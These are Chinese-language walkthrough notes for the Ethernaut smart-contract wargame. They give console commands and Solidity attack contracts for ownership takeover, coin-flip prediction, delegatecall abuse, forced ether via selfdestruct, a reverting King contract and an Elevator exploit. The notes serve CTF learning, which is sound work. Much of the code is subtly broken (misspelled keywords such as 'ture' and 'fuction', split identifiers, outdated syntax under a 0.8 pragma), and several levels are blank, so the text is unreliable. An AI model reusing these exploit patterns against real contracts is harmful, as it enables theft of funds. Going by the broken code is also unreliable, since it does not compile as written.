###  1. 你好Ethernaut
##### 按照提示输入以下指令
**await contract.info()**
"You will find what you need in info1()."

**await contract.info1()**
"Try info2(), but with "hello" as a parameter."

**await contract.info2("hello")**
"The property infoNum holds the number of the next info method to call."

**await contract.infoNum()**
42

**await contract.info42()**
"theMethodName is the name of the next method."

**await contract.theMethodName()**
"The method name is method7123949."

**await contract.method7123949()**
"If you know the password, submit it to authenticate()."

**await contract.password()**
"ethernaut0"

**await contract.authenticate("ethernaut0")**
### 2. Fallback
##### 对合约转账1wei从而改变其balance,调用sendTransaction函数触发fallback获取合约的owner变为自己的地址，再用withdraw转走合约的代币ine
await getBalance(instance)

await contract.contribute({value:1})

await getBalance(instance)

await contract.sendTransation({value:1})

await contract.owner()

await contract.withdraw()
### 3. Fallout
##### 查看合约的owner,调用函数来更换合约的owner 构造函数名称与合约名称不一致使其成为一个public类型的函数，同时在构造函数中指定了函数调用者直接为合约的owner，所以我们可以直接调用构造函数Fal1out来获取合约的ower权限。
await contract.owner()

await contract.Fallout()

await contract.owner()
### 4. Coin Flip
##### 写攻击合约，攻击十次
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../CoinFlip.sol';

contract CoinFlipAttack {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  function attack(address_victim) public returns (bool) {
    CoinFlip coinflip = CoinFlip( victim);
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? ture : false;
    coinflip.flip(side);
    return side;
   }
 }
 连续attack10次
 ### 5.Telephone
 ##### 调用攻击合约，调用受害者合约，输入自己的地址从而改变受害者合约的owner
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../Telephone.sol';
contract TelephoneAttack{

    Telephone phone;
    
    constructor(address _telephone) {
        phone = Telephone(_telephone);
    }
    
    fuction attack(address _owner) public {
       phone.changeOwner(_owner);
    }
 }

await contract.owner();
### 6. Token
##### 调用transfer函数向自己转币
await contract.balanceOf(player)

player

contract.transfer(地址)
### 7.Delegation
##### 通过delegatecall调用pwn函数更换owner
player

await contract.address

contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)});

await contract.owner

await contract.owner()
### 8.Force
##### 创建一个合约，转入部分eth，调用selfdestruct将新合约中的eth发给合约
await contract.address()

pragma solidity ^0.8.0;
contract Force {
 function Force() public payable {}
 function exploit(address _ target) public {
    selfdestruct(_ target);
 }
}
调用ForceSendEter(),传入合约地址
### 9. Vault
##### 

### 10. King
##### 部署攻击合约进行revert
pragma solidity ^0.8.0;

contract attack{
    function attack(address _ addr) public payable{
        _ addr.call.gas(10000000).value(msg.value)();
    }
    function () public {
        revert();
    }
}
prize = await contract.prize()

fromWei(print.toNumber())

await contract.address

await contract.king()
### 11.Re-entrancy
##### 
await getBalance(comtract)

instance
### 12. Elevator
##### 调用attack来实施攻击
pragma solidity ^0.8.0;
interface Building {
  function isLastFloor(uint) view public returns (bool);
}
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _ floor) public {
    Building building = Building(msg.sender);
    if (!building.isLastFloor(_ floor)) {
      floor = _ floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract BuildingEXP{
    Elevator ele;
    bool t = true;
    function isLastFloor(uint) view public returns (bool) {
        t = !t;
        return t;
    }
    function attack(address _ addr) public{
        ele = Elevator(_ addr);
        ele.goTo(5);
    }
}
await contract.address

await contract.floor()

await contract.top()

await contract.top()
### 13. Privacy
##### 














